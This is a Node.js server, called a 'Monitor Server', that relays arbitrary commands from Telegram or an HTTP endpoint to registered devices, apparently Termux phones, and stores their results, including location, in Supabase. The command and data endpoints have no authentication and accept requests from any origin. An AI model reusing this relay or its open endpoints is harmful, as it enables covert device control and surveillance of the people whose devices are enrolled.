const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(cors());
app.use(express.json());

// ==================== Environment Variables ====================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY; // Use service role key for admin
const SERVER_URL = process.env.SERVER_URL; // e.g., https://yourapp.onrender.com

if (!TELEGRAM_TOKEN || !SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error('Missing required environment variables');
  process.exit(1);
}

// ==================== Initialize Clients ====================
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// Set webhook if SERVER_URL provided
if (SERVER_URL) {
  bot.setWebHook(`${SERVER_URL}/webhook`).then(() => {
    console.log('Webhook set successfully');
  }).catch(err => {
    console.error('Failed to set webhook:', err);
  });
}

// ==================== Store connected devices ====================
// Map deviceId -> socket
const devices = new Map();

// ==================== Helper: Store command result in Supabase ====================
async function storeResult(deviceId, command, result, type = null) {
  try {
    const { error } = await supabase
      .from('command_results')
      .insert([{ device_id: deviceId, command, result, type }]);
    if (error) throw error;
  } catch (err) {
    console.error('Error storing result:', err);
  }
}

// ==================== Helper: Update device last seen ====================
async function updateDeviceLastSeen(deviceId, info = null) {
  try {
    const updateData = { last_seen: new Date() };
    if (info) updateData.info = info;
    const { error } = await supabase
      .from('devices')
      .upsert({ id: deviceId, ...updateData }, { onConflict: 'id' });
    if (error) throw error;
  } catch (err) {
    console.error('Error updating device:', err);
  }
}

// ==================== WebSocket ====================
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);

  socket.on('register', async (data) => {
    const { deviceId, info } = data;
    if (deviceId) {
      devices.set(deviceId, socket);
      socket.deviceId = deviceId;
      console.log(`Device registered: ${deviceId}`);
      await updateDeviceLastSeen(deviceId, info);
      socket.emit('registered', { status: 'ok' });
    }
  });

  socket.on('commandResult', async (data) => {
    const { command, result, chatId, type } = data;
    const deviceId = socket.deviceId;
    if (deviceId) {
      // Store in Supabase
      await storeResult(deviceId, command, result, type);
      // If command came from Telegram, forward result to Telegram
      if (chatId) {
        bot.sendMessage(chatId, result).catch(err => {
          console.error('Failed to send Telegram message:', err);
        });
      }
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    if (socket.deviceId) {
      devices.delete(socket.deviceId);
    }
  });
});

// ==================== Telegram Webhook ====================
app.post('/webhook', (req, res) => {
  const update = req.body;
  if (update.message) {
    const chatId = update.message.chat.id;
    const text = update.message.text;
    // Use chat ID as device ID (or you could map multiple devices)
    const deviceId = chatId.toString();

    const deviceSocket = devices.get(deviceId);
    if (deviceSocket) {
      // Forward command to device
      deviceSocket.emit('command', { command: text, chatId });
      res.sendStatus(200);
    } else {
      // Device not connected, store as pending? For now, notify user
      bot.sendMessage(chatId, 'Device is offline or not registered.')
        .catch(err => console.error(err));
      res.sendStatus(200);
    }
  } else {
    res.sendStatus(200);
  }
});

// ==================== Termux Command Endpoint ====================
app.post('/sendCommand', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'deviceId and command required' });
  }

  const deviceSocket = devices.get(deviceId);
  if (deviceSocket) {
    deviceSocket.emit('command', { command, chatId: null });
    res.json({ status: 'sent' });
  } else {
    // Check if device exists in database but offline
    const { data, error } = await supabase
      .from('devices')
      .select('id')
      .eq('id', deviceId)
      .single();
    if (data) {
      res.status(404).json({ error: 'Device is offline' });
    } else {
      res.status(404).json({ error: 'Device not found' });
    }
  }
});

// ==================== API Endpoints to Query Data ====================

// Get all registered devices
app.get('/api/devices', async (req, res) => {
  const { data, error } = await supabase
    .from('devices')
    .select('*')
    .order('last_seen', { ascending: false });
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

// Get command results for a device (with optional limit)
app.get('/api/results/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 50;
  const { data, error } = await supabase
    .from('command_results')
    .select('*')
    .eq('device_id', deviceId)
    .order('created_at', { ascending: false })
    .limit(limit);
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

// Get latest result of a specific type for a device (e.g., last location)
app.get('/api/latest/:deviceId/:type', async (req, res) => {
  const { deviceId, type } = req.params;
  const { data, error } = await supabase
    .from('command_results')
    .select('*')
    .eq('device_id', deviceId)
    .eq('type', type)
    .order('created_at', { ascending: false })
    .limit(1)
    .single();
  if (error) return res.status(404).json({ error: 'No data found' });
  res.json(data);
});

// ==================== Health Check ====================
app.get('/', (req, res) => {
  res.send('Monitor Server is running with Supabase');
});

// ==================== Start Server ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});